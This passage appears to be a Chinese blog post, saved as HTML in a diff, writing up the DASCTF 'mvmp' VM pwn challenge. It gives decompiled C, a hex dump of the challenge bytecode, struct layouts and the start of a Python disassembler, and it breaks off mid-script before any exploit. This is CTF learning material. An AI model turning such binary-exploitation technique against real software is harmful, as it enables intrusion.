@@ -1,0 +1,888 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <script type="application/javascript" src='https://ret2ldz.github.io/js/theme-mode.js'></script>
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/frameworks.min.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/github.min.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/github-style.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/light.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/dark.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/syntax.css' />
+    <title>DASCTF-mvmp - ldz&#39;s blog</title>
+    
+    <link rel="icon" type="image/x-icon" href='/images/github-mark.png'>
+    
+    <meta name="theme-color" content="#1e2327">
+
+    
+    
+
+    
+    <meta name="description"
+  content="一道有意思的vmpwn" />
+<meta name="keywords"
+  content='blog, google analytics' />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://ret2ldz.github.io/post/dasctf-mvmp/" />
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="DASCTF-mvmp - ldz&#39;s blog" />
+<meta name="twitter:description"
+  content="一道有意思的vmpwn" />
+<meta name="twitter:site" content="https://ret2ldz.github.io/" />
+<meta name="twitter:creator" content="" />
+<meta name="twitter:image"
+  content="https://ret2ldz.github.io/">
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="DASCTF-mvmp - ldz&#39;s blog">
+<meta property="og:description"
+  content="一道有意思的vmpwn" />
+<meta property="og:url" content="https://ret2ldz.github.io/post/dasctf-mvmp/" />
+<meta property="og:site_name" content="DASCTF-mvmp" />
+<meta property="og:image"
+  content="https://ret2ldz.github.io/">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+<body>
+  <div style="position: relative">
+  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
+    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
+      <a class="Header-link" href="https://ret2ldz.github.io/">
+        <img class="octicon" height="32" width="32" src="/images/github-mark-white.png">
+      </a>
+    </div>
+    <div class="Header-item d-md-none">
+      <button class="Header-link btn-link js-details-target" type="button"
+        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
+        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
+          <path fill-rule="evenodd" d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
+          </path>
+        </svg>
+      </button>
+    </div>
+    <div style="display: none;" id="header-search"
+      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
+      <div
+        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
+        <div class="position-relative">
+          
+          <form target="_blank" id="search-form" action="" accept-charset="UTF-8" method="get"
+            autocomplete="off">
+            <label
+              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
+              <input type="text"
+                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
+                name="q" value="" placeholder="Search" autocomplete="off">
+            </label>
+          </form>
+          
+        </div>
+      </div>
+    </div>
+
+    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
+      <a class="Header-link " href="https://ret2ldz.github.io/">
+        <img class="octicon octicon-mark-github v-align-middle" height="32" width="32" src="/images/github-mark-white.png">
+      </a>
+    </div>
+    <div class="Header-item" style="margin-right: 0;">
+      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
+        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
+          version="1.1" width="16" height="16">
+          <path fill-rule="evenodd" clip-rule="evenodd"
+            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
+          </path>
+        </svg>
+      </a>
+    </div>
+  </header>
+</div>
+
+  <div id="search-result" class="container-lg px-3 new-discussion-timeline" style="display: none;">
+</div>
+
+  
+<div class="application-main">
+  <div>
+  <main>
+    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
+      <div class="px-0">
+        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
+          <div class="flex-auto min-width-0 width-fit mr-3">
+            <div class="d-flex">
+              <div class="d-none d-md-block">
+                <a class="avatar mr-2 flex-shrink-0" href="https://ret2ldz.github.io/">
+                  <img class=" avatar-user"
+                    src="https://ret2ldz.github.io/images/images.png"
+                    width="32" height="32"></a>
+              </div>
+              <div class="d-flex flex-column">
+                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
+                  <span class="author">
+                    <a href="https://ret2ldz.github.io/">ldz</a>
+                  </span>
+                  <span class="path-divider">/</span>
+                  <strong class="css-truncate css-truncate-target mr-1" style="max-width: 410px">
+                    <a href="https://ret2ldz.github.io/post/dasctf-mvmp/">DASCTF-mvmp</a>
+                  </strong>
+                </h1>
+                <div class="note m-0">
+                  Created <relative-time datetime="Mon, 01 Jan 0001 00:00:00 &#43;0000"
+                    class="no-wrap">
+                    Mon, 01 Jan 0001 00:00:00 &#43;0000</relative-time>
+
+                  
+                  <span class="file-info-divider"></span>
+                  Modified <relative-time datetime="Sat, 20 Dec 2025 22:59:53 &#43;0800"
+                    class="no-wrap">
+                    Sat, 20 Dec 2025 22:59:53 &#43;0800</relative-time>
+                  
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-lg px-3 new-discussion-timeline">
+      <div class="repository-content gist-content">
+        <div>
+          <div class="js-gist-file-update-container js-task-list-container file-box">
+            <div id="file-pytest" class="file my-2">
+              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
+                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
+                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
+                    
+                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
+                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
+                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
+                      </svg>
+                    </summary>
+                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
+                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
+                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
+                        </div>
+                      </div>
+                    </details-menu>
+                      3352 Words
+                    
+
+                  </div>
+                  <div class="file-actions flex-order-2 pt-0">
+                    
+                    
+                    <a class="muted-link mr-3" href="/tags/pwn">
+                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
+                        <path fill-rule="evenodd"
+                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
+                        </path>
+                      </svg>
+                      pwn
+                    </a>
+                    
+                    <a class="muted-link mr-3" href="/tags/vm">
+                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
+                        <path fill-rule="evenodd"
+                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
+                        </path>
+                      </svg>
+                      vm
+                    </a>
+                    
+                    <a class="muted-link mr-3" href="/tags/ctf">
+                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
+                        <path fill-rule="evenodd"
+                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
+                        </path>
+                      </svg>
+                      ctf
+                    </a>
+                    
+                    
+                  </div>
+                </div>
+              </div>
+
+
+              <div class="Box-body px-5 pb-5" style="z-index: 1">
+                <article class="markdown-body entry-content container-lg"><p><img src="../images/das0.png" alt=""></p>
+<h2 id="tldr">TL;DR</h2>
+<p>这是一道很有意思（很折磨人）的VM Pwn，不过好久没做Pwn了这么做一做确实很爽。</p>
+<h2 id="程序流程">程序流程</h2>
+<p>读入出题人自定义的程序然后执行</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">vm</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="n">vm</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x30uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">vm</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">mmap</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="mh">0x30000uLL</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">s</span><span class="o">-&gt;</span><span class="n">buffer_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;./vmcode&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">ip</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x400uLL</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">buf</span> <span class="o">+=</span> <span class="mh">0x400</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">s</span><span class="o">-&gt;</span><span class="n">opcode_len</span> <span class="o">=</span> <span class="mh">0x30000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">vmrun</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldz@ldz-OMEN-by-HP-Gaming-Laptop-16-wf0xxx:~/Downloads/mvmp/tempdir/PWN附件/change$ xxd vmcode
+</span></span><span class="line"><span class="cl">00000000: <span class="m">0000</span> <span class="m">0000</span> <span class="m">9000</span> <span class="m">0008</span> 8d00 <span class="m">4700</span> <span class="m">5768</span> <span class="m">6174</span>  ..........G.What
+</span></span><span class="line"><span class="cl">00000010: 2b00 <span class="m">0400</span> <span class="m">0000</span> <span class="m">4700</span> <span class="m">2773</span> <span class="m">2079</span> 2b00 <span class="m">0400</span>  +.....G.<span class="err">&#39;</span>s y+...
+</span></span><span class="line"><span class="cl">00000020: <span class="m">0000</span> <span class="m">4700</span> 6f75 <span class="m">7220</span> 2b00 <span class="m">0400</span> <span class="m">0000</span> <span class="m">4700</span>  ..G.our +.....G.
+</span></span><span class="line"><span class="cl">00000030: 6e61 6d65 2b00 <span class="m">0400</span> <span class="m">0000</span> <span class="m">4300</span> 3f0a <span class="m">0000</span>  name+.....C.?...
+</span></span><span class="line"><span class="cl">00000040: 8d00 7d00 c000 <span class="m">0166</span> 0e02 008d 010f <span class="m">0001</span>  ..<span class="o">}</span>....f........
+</span></span><span class="line"><span class="cl">00000050: <span class="m">0000</span> 007d 027d 017d 00c0 <span class="m">0000</span> 8bc0 <span class="m">0000</span>  ...<span class="o">}</span>.<span class="o">}</span>.<span class="o">}</span>........
+</span></span><span class="line"><span class="cl">00000060: 0cc0 <span class="m">0000</span> 4c94 <span class="m">0000</span> 08ec <span class="m">0000</span> <span class="m">0090</span> <span class="m">0000</span>  ....L...........
+</span></span><span class="line"><span class="cl">00000070: 068d 000f <span class="m">0100</span> <span class="m">0000</span> 000f <span class="m">0218</span> <span class="m">0000</span> 007d  ...............<span class="o">}</span>
+</span></span><span class="line"><span class="cl">00000080: 027d 017d 00c0 <span class="m">0000</span> 888d 010f <span class="m">0000</span> <span class="m">0000</span>  .<span class="o">}</span>.<span class="o">}</span>............
+</span></span><span class="line"><span class="cl">00000090: 000f <span class="m">0250</span> <span class="m">0000</span> 007d 027d 017d 00c0 <span class="m">0000</span>  ...P...<span class="o">}</span>.<span class="o">}</span>.<span class="o">}</span>....
+</span></span><span class="line"><span class="cl">000000a0: 1e8d 017d 01c0 <span class="m">0000</span> a194 <span class="m">0000</span> 06ec <span class="m">0000</span>  ...<span class="o">}</span>............
+</span></span><span class="line"><span class="cl">000000b0: 000f <span class="m">0000</span> <span class="m">0000</span> 00cc <span class="m">0000</span> 3cec <span class="m">0000</span> 007d  ..........&lt;....<span class="o">}</span>
+</span></span><span class="line"><span class="cl">000000c0: 058d 052b <span class="m">0508</span> <span class="m">0000</span> 003a <span class="m">0005</span> 2b05 <span class="m">0400</span>  ...+.....:..+...
+</span></span><span class="line"><span class="cl">000000d0: <span class="m">0000</span> 3a01 052b <span class="m">0504</span> <span class="m">0000</span> 003a <span class="m">0205</span> d400  ..:..+.....:....
+</span></span><span class="line"><span class="cl">000000e0: <span class="m">0000</span> <span class="m">8105</span> ec00 <span class="m">0003</span> 7d05 8d05 2b05 <span class="m">0800</span>  ........<span class="o">}</span>...+...
+</span></span><span class="line"><span class="cl">000000f0: <span class="m">0000</span> 3a00 052b <span class="m">0504</span> <span class="m">0000</span> 003a <span class="m">0105</span> 2b05  ..:..+.....:..+.
+</span></span><span class="line"><span class="cl">00000100: <span class="m">0400</span> <span class="m">0000</span> 3a02 05d4 <span class="m">0000</span> <span class="m">0181</span> 05ec <span class="m">0000</span>  ....:...........
+</span></span><span class="line"><span class="cl">00000110: 037d 058d 052b <span class="m">0508</span> <span class="m">0000</span> 003a <span class="m">0005</span> 2b05  .<span class="o">}</span>...+.....:..+.
+</span></span><span class="line"><span class="cl">00000120: <span class="m">0400</span> <span class="m">0000</span> 3a01 052b <span class="m">0504</span> <span class="m">0000</span> 003a <span class="m">0205</span>  ....:..+.....:..
+</span></span><span class="line"><span class="cl">00000130: 0f03 <span class="m">0000</span> <span class="m">0000</span> 3e00 <span class="m">0185</span> <span class="m">0085</span> <span class="m">0306</span> <span class="m">0302</span>  ......&gt;.........
+</span></span><span class="line"><span class="cl">00000140: b080 000e <span class="m">8105</span> ec00 <span class="m">0003</span> 7d05 8d05 2b05  ..........<span class="o">}</span>...+.
+</span></span><span class="line"><span class="cl">00000150: <span class="m">0800</span> <span class="m">0000</span> <span class="m">9000</span> <span class="m">0003</span> 8d01 0e00 <span class="m">0147</span> <span class="m">0068</span>  .............G.h
+</span></span><span class="line"><span class="cl">00000160: 656c 6c2b <span class="m">0004</span> <span class="m">0000</span> <span class="m">0043</span> 006f <span class="m">2000</span> 000f  ell+.....C.o ...
+</span></span><span class="line"><span class="cl">00000170: <span class="m">0001</span> <span class="m">0000</span> 000f <span class="m">0206</span> <span class="m">0000</span> 007d 027d 017d  ...........<span class="o">}</span>.<span class="o">}</span>.<span class="o">}</span>
+</span></span><span class="line"><span class="cl">00000180: 00c0 <span class="m">8000</span> 9d3a <span class="m">0105</span> 7d01 c000 <span class="m">0020</span> 0e02  .....:..<span class="o">}</span>.... ..
+</span></span><span class="line"><span class="cl">00000190: 003a <span class="m">0105</span> 0f00 <span class="m">0100</span> <span class="m">0000</span> 7d02 7d01 7d00  .:........<span class="o">}</span>.<span class="o">}</span>.<span class="o">}</span>.
+</span></span><span class="line"><span class="cl">000001a0: c080 00bc <span class="m">9400</span> <span class="m">0003</span> <span class="m">8105</span> ec00 <span class="m">0001</span> 7d05  ..............<span class="o">}</span>.
+</span></span><span class="line"><span class="cl">000001b0: 8d05 2b05 <span class="m">0800</span> <span class="m">0000</span> 3a01 050e <span class="m">0001</span> <span class="m">3202</span>  ..+.....:.....2.
+</span></span><span class="line"><span class="cl">000001c0: <span class="m">0007</span> <span class="m">0200</span> <span class="m">0000</span> 00a8 <span class="m">0000</span> <span class="m">0685</span> 00a4 <span class="m">8000</span>  ................
+</span></span><span class="line"><span class="cl">000001d0: 132e <span class="m">0001</span> <span class="m">8105</span> ec00 <span class="m">0001</span>                 ..........
+</span></span></code></pre></div><p>程序主解析函数</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">vmrun</span><span class="p">(</span><span class="n">vm</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">s</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0xCuLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">do</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">vm_fetch_and_decode</span><span class="p">((</span><span class="kr">__int64</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v1</span> <span class="o">=</span> <span class="o">*</span><span class="n">s</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">reg_imm</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">&amp;</span> <span class="mi">3u</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">3</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">reg_reg</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="o">*</span><span class="n">s</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">reg</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">vuln</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xCuLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span><span class="o">-&gt;</span><span class="n">opcode_len</span> <span class="o">&gt;</span> <span class="mh">0x30000</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="n">a1</span><span class="o">-&gt;</span><span class="n">ip</span> <span class="o">&lt;=</span> <span class="mh">0x30000</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Segment error&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="解释器逆向">解释器逆向</h3>
+<p>我们很容易就能得出</p>
+<pre tabindex="0"><code>00000000 struct vm // sizeof=0x30
+00000000 {                                       // XREF: LOAD:00000000000006A0/r
+00000000                                         // LOAD:00000000000006E8/r ...
+00000000     unsigned __int64 buffer_ptr;
+00000008     unsigned __int32 ip;
+0000000C     unsigned __int32 padding1;
+00000010     unsigned __int32 padding2;
+00000014     unsigned __int32 padding3;
+00000018     unsigned __int32 padding4;
+0000001C     unsigned __int32 padding5;
+00000020     unsigned __int32 padding6;
+00000024     unsigned __int32 opcode_len;
+00000028     unsigned __int32 padding8;
+0000002C     // padding byte
+0000002D     // padding byte
+0000002E     // padding byte
+0000002F     // padding byte
+00000030 };
+
+00000000 struct $10AF91F549049757C80DE4718B6BE9BB // sizeof=0xC
+00000000 {
+00000000     uint8_t raw_op;   
+00000001     uint8_t opcode; 
+00000002     uint8_t _unused[2]; 
+00000004     uint32_t operand1;
+00000008     uint32_t operand2;
+0000000C };
+</code></pre><h3 id="程序逆向">程序逆向</h3>
+<p>我们不妨让AI写出逆向脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">VM_FILENAME</span> <span class="o">=</span> <span class="s2">&#34;vmcode&#34;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Type 3: [Op] [Reg] [Imm4]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># handler: reg_imm</span>
+</span></span><span class="line"><span class="cl"><span class="n">OP_IMM</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">1</span><span class="p">:</span> <span class="s2">&#34;CMP&#34;</span><span class="p">,</span>   <span class="c1"># Compare Reg, Imm</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">2</span><span class="p">:</span> <span class="s2">&#34;CMPS&#34;</span><span class="p">,</span>  <span class="c1"># Compare Signed</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">3</span><span class="p">:</span> <span class="s2">&#34;MOV&#34;</span><span class="p">,</span>   <span class="c1"># Reg = Imm</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">4</span><span class="p">:</span> <span class="s2">&#34;XOR&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">5</span><span class="p">:</span> <span class="s2">&#34;OR&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">6</span><span class="p">:</span> <span class="s2">&#34;AND&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">7</span><span class="p">:</span> <span class="s2">&#34;SHL&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">8</span><span class="p">:</span> <span class="s2">&#34;SHR&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">10</span><span class="p">:</span> <span class="s2">&#34;ADD&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">11</span><span class="p">:</span> <span class="s2">&#34;SUB&#34;</span><span class="p">,</span>
